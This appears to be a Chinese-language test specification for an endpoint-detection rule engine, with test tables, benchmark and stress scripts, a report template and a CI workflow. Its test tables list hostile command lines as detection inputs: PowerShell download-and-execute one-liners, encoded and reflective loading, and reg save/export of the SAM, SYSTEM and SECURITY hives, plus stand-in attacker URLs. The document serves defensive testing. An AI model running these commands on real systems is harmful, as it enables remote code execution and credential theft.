# P0 动态行为引擎测试用例

**版本**：1.0
**日期**：2026-04-28
**状态**：已完成

---

## 1. 测试概述

本文档定义了P0动态行为引擎的测试用例，包括功能测试、性能测试和压力测试。

---

## 2. 测试用例矩阵

### 2.1 R-EXEC-001 测试用例

| 用例ID | 进程名 | 命令行 | 预期结果 | 测试说明 |
|--------|--------|--------|----------|----------|
| RE-001 | powershell.exe | -EncodedCommand SQBFAFgAIAA... | MATCH | 标准Base64编码命令 |
| RE-002 | powershell.exe | -enc SQBFAFgAIAA... | MATCH | 短参数编码命令 |
| RE-003 | powershell.exe | -e SQBFAFgAIAA... | MATCH | 单字符参数编码命令 |
| RE-004 | powershell.exe | -EncodedCommand | MATCH | 只有参数无值 |
| RE-005 | pwsh.exe | -EncodedCommand SQBFAFgAIAA... | MATCH | PowerShell Core |
| RE-006 | cmd.exe | -EncodedCommand SQBFAFgAIAA... | NO_MATCH | cmd不支持编码命令 |
| RE-007 | notepad.exe | -EncodedCommand SQBFAFgAIAA... | NO_MATCH | 非脚本进程 |
| RE-008 | powershell.exe | -enc -Join (Base64字符串) | MATCH | -Join参数 |
| RE-009 | powershell.exe | [System.Convert]::FromBase64String("SQBFAFgAIAA...") | MATCH | .NET方法调用 |
| RE-010 | powershell.exe | iex (New-Object Net.WebClient).DownloadString('http://x/x.ps1') | MATCH | 远程下载执行 |

### 2.2 R-CRED-001 测试用例

| 用例ID | 进程名 | 命令行 | 预期结果 | 测试说明 |
|--------|--------|--------|----------|----------|
| RC-001 | reg.exe | reg save HKLM\SAM C:\temp\sam.save /y | MATCH | SAM凭证导出 |
| RC-002 | reg.exe | save HKLM\SYSTEM C:\temp\sys.save | MATCH | SYSTEM凭证导出 |
| RC-003 | reg.exe | export HKLM\SECURITY C:\temp\sec.reg | MATCH | SECURITY凭证导出 |
| RC-004 | cmd.exe | reg save HKLM\SAM C:\temp\sam.save | NO_MATCH | 非reg进程 |
| RC-005 | reg.exe | query HKLM\SAM | NO_MATCH | 查询不是导出 |
| RC-006 | reg.exe | reg add HKLM\SOFTWARE\Test | NO_MATCH | 添加不是导出 |

### 2.3 R-FILELESS-001 测试用例

| 用例ID | 进程名 | 命令行 | 预期结果 | 测试说明 |
|--------|--------|--------|----------|----------|
| RF-001 | powershell.exe | IEX (New-Object Net.WebClient).DownloadString('http://x/x.ps1') | MATCH | 标准无文件攻击 |
| RF-002 | powershell.exe | Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x/x.ps1') | MATCH | Invoke-Expression变体 |
| RF-003 | powershell.exe | [Reflection.Assembly]::Load(...) | MATCH | 反射加载 |
| RF-004 | powershell.exe | iex powershell -enc SQBFAFgAIAA... | MATCH | iex简化形式 |
| RF-005 | cmd.exe | IEX (New-Object Net.WebClient).DownloadString(...) | NO_MATCH | cmd不支持IEX |
| RF-006 | notepad.exe | Invoke-Expression cmd | NO_MATCH | 非脚本进程 |

---

## 3. 测试数据

### 3.1 Base64编码的测试字符串

**"echo test" 的Base64编码**：
```
Base64: ZWNobyB0ZXN0
```

**"whoami" 的Base64编码**：
```
Base64: d2hvYW1p
```

### 3.2 恶意URL样本

```
http://evil.com/payload.ps1
https://malicious.site/download.ps1
http://attacker.net/shell.ps1
```

---

## 4. 自动化测试脚本

### 4.1 Linux/macOS 测试脚本

```bash
#!/bin/bash
# p0_rule_functional_test.sh

export EDR_P0_DIRECT_EMIT=1

cd "$(dirname "$0")/.."

echo "=== P0 Rule Engine Functional Tests ==="

./test/p0_rule_golden_test

if [ $? -eq 0 ]; then
    echo "PASS: All functional tests passed"
    exit 0
else
    echo "FAIL: Some functional tests failed"
    exit 1
fi
```

### 4.2 Windows 测试脚本

```powershell
# p0_rule_functional_test.ps1

$env:EDR_P0_DIRECT_EMIT = "1"

Write-Host "=== P0 Rule Engine Functional Tests ==="

& .\test\p0_rule_golden_test.exe

if ($LASTEXITCODE -eq 0) {
    Write-Host "PASS: All functional tests passed"
    exit 0
} else {
    Write-Host "FAIL: Some functional tests failed"
    exit 1
}
```

### 4.3 性能基准测试脚本

```bash
#!/bin/bash
# p0_rule_benchmark.sh

export EDR_P0_DIRECT_EMIT=1

echo "=== P0 Rule Engine Performance Benchmark ==="
echo "Date: $(date)"
echo ""

ITERATIONS=${1:-100000}

echo "Running $ITERATIONS iterations..."

START=$(date +%s%N)

for i in $(seq 1 $ITERATIONS); do
    ./test/p0_rule_golden_test --quick > /dev/null 2>&1
done

END=$(date +%s%N)
ELAPSED=$(( ($END - $START) / 1000000 ))

echo "Total time: ${ELAPSED}ms"
echo "Average per iteration: $(( $ELAPSED / $ITERATIONS ))us"
echo "Throughput: $(( $ITERATIONS * 1000 / $ELAPSED )) ops/sec"
```

---

## 5. 压力测试

### 5.1 高并发压力测试

模拟多线程同时调用P0规则引擎：

```bash
#!/bin/bash
# p0_stress_test.sh

export EDR_P0_DIRECT_EMIT=1

THREADS=${1:-4}
ITERATIONS=${2:-10000}

echo "=== P0 Rule Engine Stress Test ==="
echo "Threads: $THREADS"
echo "Iterations per thread: $ITERATIONS"
echo ""

run_thread() {
    local tid=$1
    local start=$(date +%s%N)
    for i in $(seq 1 $ITERATIONS); do
        ./test/p0_rule_golden_test --quick > /dev/null 2>&1
    done
    local end=$(date +%s%N)
    local elapsed=$(( ($end - $start) / 1000000 ))
    echo "Thread $tid completed in ${elapsed}ms"
}

for i in $(seq 1 $THREADS); do
    run_thread $i &
done

wait

echo ""
echo "Stress test completed"
```

### 5.2 内存压力测试

验证在内存压力下P0规则引擎的稳定性：

```bash
#!/bin/bash
# p0_memory_stress.sh

export EDR_P0_DIRECT_EMIT=1

echo "=== P0 Rule Engine Memory Stress Test ==="

for i in $(seq 1 1000); do
    ./test/p0_rule_golden_test --stress > /dev/null 2>&1
    if [ $(( $i % 100 )) -eq 0 ]; then
        echo "Completed $i iterations"
    fi
done

echo "Memory stress test completed"
```

---

## 6. 测试报告模板

### 6.1 每日测试报告

```markdown
# P0 Rule Engine Test Report

**Date**: YYYY-MM-DD
**Tester**: [Name]
**Build**: [Build ID]

## Test Summary

| Category | Passed | Failed | Total |
|----------|--------|--------|-------|
| Functional | X | Y | Z |
| Performance | X | Y | Z |
| Stress | X | Y | Z |

## Detailed Results

### Functional Tests

| Test Case | Result | Time | Notes |
|-----------|--------|------|-------|
| RE-001 | PASS/FAIL | Xms | ... |
| ... | ... | ... | ... |

### Performance Tests

| Metric | Result | Threshold | Status |
|--------|--------|-----------|--------|
| Avg Latency | Xms | <Yms | PASS/FAIL |
| Throughput | Xops/s | >Yops/s | PASS/FAIL |

## Issues Found

1. [Issue description]
2. ...

## Recommendations

1. ...
```

---

## 7. 持续集成配置

### 7.1 GitHub Actions Workflow

```yaml
name: P0 Rule Engine Tests

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v3
      - name: Build
        run: cmake --build . --config Release
      - name: Run Tests
        run: |
          $env:EDR_P0_DIRECT_EMIT = "1"
          ./test/p0_rule_golden_test.exe
          ./test/p0_rule_perf_test.exe
```

---

*文档生成时间：2026-04-28*